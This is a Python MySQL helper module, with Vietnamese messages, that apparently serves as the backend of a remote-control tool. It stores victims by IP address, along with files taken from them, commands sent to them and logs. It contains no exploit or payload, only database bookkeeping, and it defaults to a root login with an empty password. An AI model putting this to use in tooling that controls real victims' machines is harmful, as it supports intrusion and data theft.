import mysql.connector

def connect_to_database(host="localhost", user="root", password="", database="database_pbl4", port=3306):
    try:
        conn = mysql.connector.connect(
            host=host,
            user=user,
            password=password,
            database=database,
            port=port
        )
        if conn.is_connected():
            print("Kết nối đến cơ sở dữ liệu thành công!")
        return conn
    except mysql.connector.Error as err:
        print(f"Lỗi kết nối cơ sở dữ liệu: {err}")
        return None

def close_connection(conn):
    if conn and conn.is_connected():
        conn.close()
        print("Đã đóng kết nối đến cơ sở dữ liệu.")

def insert_file_info(conn, victimid, filename, filepath, upload_time):
    try:
        cursor = conn.cursor()
        query = """
            INSERT INTO files (victim_id, file_name, file_path, uploaded_at) 
            VALUES (%s, %s, %s, %s)
        """
        cursor.execute(query, (victimid, filename, filepath, upload_time))
        conn.commit()  # Ghi dữ liệu vào cơ sở dữ liệu
        print(f"Đã lưu thông tin tệp {filename} vào cơ sở dữ liệu.")
    except mysql.connector.Error as e:
        print(f"Lỗi khi lưu vào cơ sở dữ liệu: {e}")

def get_victimid_by_ip(host):
    conn = connect_to_database()
    if conn is None:
        print("Không thể kết nối cơ sở dữ liệu.")
        return None

    try:
        cursor = conn.cursor()
        query = "SELECT id FROM victims WHERE ip_address = %s"
        cursor.execute(query, (host,))
        result = cursor.fetchone()
        
        if result:
            return result[0] 
        else:
            print("Không tìm thấy nạn nhân với IP này.")
            return None
    except mysql.connector.Error as err:
        print(f"Lỗi khi truy vấn cơ sở dữ liệu: {err}")
        return None
    finally:
        if conn.is_connected():
            conn.close()
            print("Đã đóng kết nối cơ sở dữ liệu.")
    
def insert_command(conn, victimid, command, status, execution_time):
    try:
        cursor = conn.cursor()
        query = """
            INSERT INTO commands (victim_id, command_text, status, execution_time) 
            VALUES (%s, %s, %s, %s)
        """
        cursor.execute(query, (victimid, command, status, execution_time))
        conn.commit()  # Ghi dữ liệu vào cơ sở dữ liệu
        print(f"Đã lưu lệnh command {command} vào cơ sở dữ liệu.")
    except mysql.connector.Error as e:
        print(f"Lỗi khi lưu vào cơ sở dữ liệu: {e}")

def insert_log(conn, victimid, type, created_at):
    try:
        cursor = conn.cursor()
        query = """
            INSERT INTO logs (victim_id, log_type, created_at) 
            VALUES (%s, %s, %s)
        """
        cursor.execute(query, (victimid, type, created_at))
        conn.commit()  # Ghi dữ liệu vào cơ sở dữ liệu
        print(f"Đã lưu lệnh log {type} vào cơ sở dữ liệu.")
    except mysql.connector.Error as e:
        print(f"Lỗi khi lưu vào cơ sở dữ liệu: {e}")

def get_all_victims_ip():
    conn = connect_to_database() 
    if conn is None:
        return []

    try:
        cursor = conn.cursor()
        query = "SELECT ip_address FROM victims"
        cursor.execute(query)
        results = cursor.fetchall() 

        if results:
            ip_list = [result[0] for result in results]  
            return ip_list
        else:
            return []
    except mysql.connector.Error as err:
        return []
    finally:
        close_connection(conn)


def add_victim(conn, ip_address):
    if conn is None:
        print("Không thể kết nối cơ sở dữ liệu.")
        return

    try:
        cursor = conn.cursor()
        query = "INSERT INTO victims (ip_address) VALUES (%s)"
        cursor.execute(query, (ip_address,))
        conn.commit()  
        print(f"Đã thêm nạn nhân với IP {ip_address} vào cơ sở dữ liệu.")
    except mysql.connector.Error as e:
        print(f"Lỗi khi thêm nạn nhân vào cơ sở dữ liệu: {e}")
